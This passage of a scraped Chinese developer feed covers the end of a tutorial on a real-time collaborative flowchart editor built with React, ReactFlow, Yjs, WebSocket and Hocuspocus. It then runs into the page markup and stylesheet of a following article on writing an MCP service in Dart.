  <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(cursors.<span class="hljs-title function_">entries</span>()).<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">[clientId, state]</span>) =&gt;</span> {
    <span class="hljs-keyword">if</span> (!state.<span class="hljs-property">cursor</span> || clientId === currentClientId) {
      <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    }

    <span class="hljs-keyword">const</span> screenPosition = reactFlowInstance.<span class="hljs-title function_">flowToScreenPosition</span>({
      <span class="hljs-attr">x</span>: state.<span class="hljs-property">cursor</span>.<span class="hljs-property">x</span>,
      <span class="hljs-attr">y</span>: state.<span class="hljs-property">cursor</span>.<span class="hljs-property">y</span>,
    });

    <span class="hljs-keyword">return</span> (
      <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Cursor</span>
        <span class="hljs-attr">key</span>=<span class="hljs-string">{clientId}</span>
        <span class="hljs-attr">x</span>=<span class="hljs-string">{screenPosition.x}</span>
        <span class="hljs-attr">y</span>=<span class="hljs-string">{screenPosition.y}</span>
        <span class="hljs-attr">color</span>=<span class="hljs-string">{state.color}</span>
      /&gt;</span></span>
    );
  });
}
</code></pre>
<p>过滤掉自己的光标，将画布坐标转换回屏幕坐标（因为光标是绝对定位在屏幕上的），使用每个用户的颜色渲染光标组件。</p>
<h3 data-id="heading-18">协同光标组件</h3>
<p>在 <code>src/components/Cursor.tsx</code> 中实现光标组件，我们使用的 SVG 的方式来实现这个光标组件：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">CursorProps</span> {
  <span class="hljs-attr">x</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">y</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">color</span>: <span class="hljs-built_in">string</span>;
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Cursor</span>(<span class="hljs-params">{ x, y, color }: CursorProps</span>) {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>
      <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span>
        <span class="hljs-attr">position:</span> "<span class="hljs-attr">absolute</span>",
        <span class="hljs-attr">left:</span> <span class="hljs-attr">x</span>,
        <span class="hljs-attr">top:</span> <span class="hljs-attr">y</span>,
        <span class="hljs-attr">pointerEvents:</span> "<span class="hljs-attr">none</span>",
        <span class="hljs-attr">zIndex:</span> <span class="hljs-attr">9999</span>,
      }}
    &gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"24"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"24"</span> <span class="hljs-attr">viewBox</span>=<span class="hljs-string">"0 0 24 24"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">path</span>
          <span class="hljs-attr">d</span>=<span class="hljs-string">"M5.65376 12.3673L5.46026 12.4668L5.70974 12.8619L11.3877 21.5659L12.6377 23.192L13.1897 21.2687L16.855 8.71373L19.0002 0.939087L10.5578 3.70771L0.458496 7.88092L-1.56467 8.73732L0.0837585 10.0768L5.65376 12.3673Z"</span>
          <span class="hljs-attr">fill</span>=<span class="hljs-string">{color}</span>
        /&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}
</code></pre>
<p>这个组件接收坐标和颜色，使用 SVG 绘制一个指针形状，通过 <code>pointerEvents: "none"</code> 确保不会干扰用户的鼠标操作。</p>
<h2 data-id="heading-19">协同流程详解</h2>
<p>让我们通过一个完整的场景来理解整个协同过程。假设用户 A 拖动了一个节点，数据是如何同步到用户 B 的？</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5df63bc86c294d3d916ac90a39d65f39~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9tZW50:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768180447&amp;x-signature=WqVPDQDImnLjZ1poK6W67XdMs44%3D" alt="20251231155352" loading="lazy"/></p>
<p>整个过程分为三个阶段：</p>
<ol>
<li>
<p>第一阶段，用户 A 拖动节点，触发 handleNodesChange，更新 Yjs 文档，Yjs 文档生成增量更新。</p>
</li>
<li>
<p>第二阶段，WebsocketProvider 监听到 update 事件，将增量编码为二进制消息，通过 WebSocket 发送给服务器，服务器应用更新到服务端文档。</p>
</li>
<li>
<p>第三阶段，服务器将更新广播给所有其他客户端，用户 B 的 WebsocketProvider 收到消息，解码后应用到本地文档，触发 observe 回调，更新 React 状态，ReactFlow 重新渲染，用户 B 看到节点移动了。</p>
</li>
</ol>
<p>这个过程非常高效，因为传输的是增量数据而不是完整文档，一次节点移动可能只需要传输几十个字节。Yjs 的 CRDT 算法保证了即使有并发修改，最终所有客户端的状态也会一致。</p>
<p>因为我们项目使用的是 Monorepo 项目，所以我们只需要在终端上启动如下命令即可：</p>
<pre><code class="hljs language-bash" lang="bash">pnpm dev
</code></pre>
<p>如果看到这样的输出，说明我们的前后端都启动成功了：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ffc8e2cbd97c48a3840e82ca1d46b81a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9tZW50:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768180447&amp;x-signature=PCNfhbjyKlE47jLfoY55VHUYnhU%3D" alt="20260105085523" loading="lazy"/></p>
<p>现在我们需要在不同的浏览器都打开相同的链接：</p>
<pre><code class="hljs language-url" lang="url">http://localhost:5173/
</code></pre>
<p>因为这是用 vite 创建的项目，所以默认启动的是 5173（我要吃饭端口）</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e48b92c0e3b841f2a2fe1148c0b21b9a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9tZW50:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768180447&amp;x-signature=g0wVuKrWy0bo1VHfoUoGJ56sjhQ%3D" alt="20260105090001" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c712b23a26fe4580930b6d727a3867cb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTW9tZW50:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768180447&amp;x-signature=ad5CLfLRUJfivYJkPm59DwtTyDI%3D" alt="20260105090032" loading="lazy"/></p>
<p>最终你能看到两端鼠标实时同步过来，并且拖动节点能同步到另外一段浏览器，这就是我们实现的最简单的协同编辑器。</p>
<p>基于这个简单的协同编辑器架构，我们可以进一步扩展和丰富其功能。例如，可以增加用户身份、编辑历史回溯、权限管理、节点间的关系建立等更多功能，进一步提升协作体验和工具的实用性。</p>
<h2 data-id="heading-20">Yjs 和 WebSocket 的分工</h2>
<p>在这个架构中，Yjs 和 WebSocket 各司其职，共同完成协同编辑。</p>
<p>Yjs 的职责是维护文档状态和处理冲突。它使用 CRDT 算法确保多个客户端并发编辑时数据最终一致，生成增量更新而不是完整快照，大大减少了网络传输量，提供了 Y.Map、Y.Array 等数据结构，让我们能方便地组织复杂的文档数据。Yjs 不关心数据如何传输，它只负责生成和应用更新。</p>
<p>WebSocket 的职责是网络通信。它建立客户端和服务器之间的双向连接，传输 Yjs 生成的二进制消息，处理连接断开、重连等网络问题，维护房间隔离，确保不同房间的消息不会混淆。WebSocket 不关心消息的内容，它只负责可靠地传输数据。</p>
<p>y-websocket 将两者连接起来，监听 Yjs 文档的更新，自动发送给服务器，接收服务器的消息，自动应用到 Yjs 文档，处理同步协议（State Vector、Update）的编解码。这种职责分离的设计非常优雅，我们可以轻松替换传输层（比如用 WebRTC 代替 WebSocket）而不影响 Yjs 的使用。</p>
<h2 data-id="heading-21">使用 Hocuspocus 简化开发</h2>
<p>虽然手动实现 WebSocket 服务器能让我们深入理解协同原理，但在实际项目中，我们通常会使用更成熟的解决方案。Hocuspocus 就是 Yjs 官方推荐的协同后端框架，它提供了开箱即用的功能。</p>
<p>Hocuspocus 的核心优势在于功能完整和易于扩展。它内置了持久化支持，可以将文档保存到数据库（支持 Redis、PostgreSQL、SQLite 等），提供了身份验证和权限控制的钩子，支持文档历史和版本管理，内置了扩展系统，可以轻松添加自定义逻辑，还提供了监控和日志功能，便于调试和运维。</p>
<p>使用 Hocuspocus 搭建服务器非常简单：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">Server</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"@hocuspocus/server"</span>;

<span class="hljs-keyword">const</span> server = <span class="hljs-title class_">Server</span>.<span class="hljs-title function_">configure</span>({
  <span class="hljs-attr">port</span>: <span class="hljs-number">1234</span>,

  <span class="hljs-keyword">async</span> <span class="hljs-title function_">onAuthenticate</span>(<span class="hljs-params">{ token, documentName }</span>) {
    <span class="hljs-comment">// 验证用户身份</span>
    <span class="hljs-keyword">return</span> { <span class="hljs-attr">user</span>: { <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">"John"</span> } };
  },

  <span class="hljs-keyword">async</span> <span class="hljs-title function_">onLoadDocument</span>(<span class="hljs-params">{ documentName }</span>) {
    <span class="hljs-comment">// 从数据库加载文档</span>
    <span class="hljs-keyword">return</span> Y.<span class="hljs-title function_">encodeStateAsUpdate</span>(doc);
  },

  <span class="hljs-keyword">async</span> <span class="hljs-title function_">onStoreDocument</span>(<span class="hljs-params">{ documentName, state }</span>) {
    <span class="hljs-comment">// 保存文档到数据库</span>
    <span class="hljs-keyword">await</span> db.<span class="hljs-title function_">save</span>(documentName, state);
  },
});

server.<span class="hljs-title function_">listen</span>();
</code></pre>
<p>前端使用 HocuspocusProvider 替代 WebsocketProvider：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">HocuspocusProvider</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"@hocuspocus/provider"</span>;

<span class="hljs-keyword">const</span> provider = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HocuspocusProvider</span>({
  <span class="hljs-attr">url</span>: <span class="hljs-string">"ws://localhost:1234"</span>,
  <span class="hljs-attr">name</span>: <span class="hljs-string">"flow-room"</span>,
  <span class="hljs-attr">document</span>: doc,
  <span class="hljs-attr">token</span>: <span class="hljs-string">"user-auth-token"</span>,
});
</code></pre>
<p>Hocuspocus 还提供了很多实用的扩展，比如 Webhooks 扩展可以在文档变化时触发 HTTP 请求，Logger 扩展可以记录所有操作日志，Throttle 扩展可以限制更新频率防止滥用，Database 扩展提供了多种数据库的开箱即用支持。</p>
<p>对于生产环境的应用，建议使用 Hocuspocus 而不是自己实现 WebSocket 服务器，这样可以节省大量开发时间，获得更稳定可靠的服务。</p>
<h2 data-id="heading-22">总结</h2>
<p>通过这个实战案例，我们完整地实现了一个协同流程图编辑器，涵盖了协同编辑的核心要素。</p>
<p>首先是架构设计。前端使用 React + ReactFlow 构建 UI，后端使用 NestJS + WebSocket 处理协同，Yjs 作为协同引擎在前后端之间同步数据。这种架构清晰地分离了视图层、业务逻辑层和传输层。</p>
<p>其次是实现细节。后端管理文档实例和连接，处理 Sync 和 Awareness 消息，监听文档更新并广播给所有客户端。前端初始化 Yjs 文档和 WebSocket 连接，使用 Y.Map 存储节点和连接，监听用户操作并更新 Yjs 文档，渲染其他用户的协同光标。</p>
<p>再看协同流程。用户操作触发 Yjs 文档更新，生成增量数据，通过 WebSocket 发送给服务器，服务器广播给其他客户端，其他客户端应用更新并重新渲染。整个过程高效且可靠，得益于 Yjs 的 CRDT 算法和增量同步机制。</p>
<p>最后是工程化建议。在理解了底层原理后，实际项目中建议使用 Hocuspocus 简化开发，它提供了持久化、权限控制、监控等生产级功能，让我们能专注于业务逻辑而不是底层实现。</p>
<p>通过这个案例，我们不仅学会了如何构建协同应用，更重要的是理解了协同编辑的核心思想：通过 CRDT 算法保证最终一致性，通过增量同步减少网络传输，通过 Awareness 实现实时协作体验。这些理念可以应用到各种协同场景中，无论是文档编辑、画板协作还是数据表格。</p>
<h2 data-id="heading-23">参考资料</h2>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.yjs.dev%2F" target="_blank" title="https://docs.yjs.dev/" ref="nofollow noopener noreferrer">Yjs 官方文档</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Freactflow.dev%2F" target="_blank" title="https://reactflow.dev/" ref="nofollow noopener noreferrer">ReactFlow 文档</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Ftiptap.dev%2Fhocuspocus" target="_blank" title="https://tiptap.dev/hocuspocus" ref="nofollow noopener noreferrer">Hocuspocus 文档</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fyjs%2Fy-websocket" target="_blank" title="https://github.com/yjs/y-websocket" ref="nofollow noopener noreferrer">y-websocket GitHub</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.nestjs.com%2Fwebsockets%2Fgateways" target="_blank" title="https://docs.nestjs.com/websockets/gateways" ref="nofollow noopener noreferrer">NestJS WebSocket</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[如何用 Dart 写个自己的MCP服务]]></title>    <link>https://juejin.cn/post/7591350620189114374</link>    <guid>https://juejin.cn/post/7591350620189114374</guid>    <pubDate>2026-01-04T22:57:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7591350620189114374" data-draft-id="7591510742634414143" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="如何用 Dart 写个自己的MCP服务"/> <meta itemprop="keywords" content="Flutter,MCP,Dart"/> <meta itemprop="datePublished" content="2026-01-04T22:57:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="张风捷特烈"/> <meta itemprop="url" content="https://juejin.cn/user/149189281194766"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            如何用 Dart 写个自己的MCP服务
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/149189281194766/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    张风捷特烈
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-04T22:57:32.000Z" title="Sun Jan 04 2026 22:57:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"「";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"」";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"✓";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class 